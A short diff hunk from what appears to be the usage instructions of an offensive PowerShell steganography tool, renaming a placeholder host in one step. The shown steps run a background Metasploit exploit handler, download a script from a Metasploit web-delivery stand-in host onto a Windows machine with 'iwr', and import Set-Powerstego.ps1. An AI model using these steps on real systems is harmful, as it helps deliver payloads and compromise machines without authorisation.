@@ -113,7 +113,7 @@
     exploit -j -z
 
     3 - From your Windows machine download the powershell script from webdelivery.
-    iwr http://IPDOHOSTMESTASPLOIT/report -OutFile report.txt
+    iwr http://IPFROMMETASPLOITHOST/report -OutFile report.txt
  
     4 - Open the powershell and import the Set-Powerstego.ps1.
     Import-Module Set-Powerstego.ps1
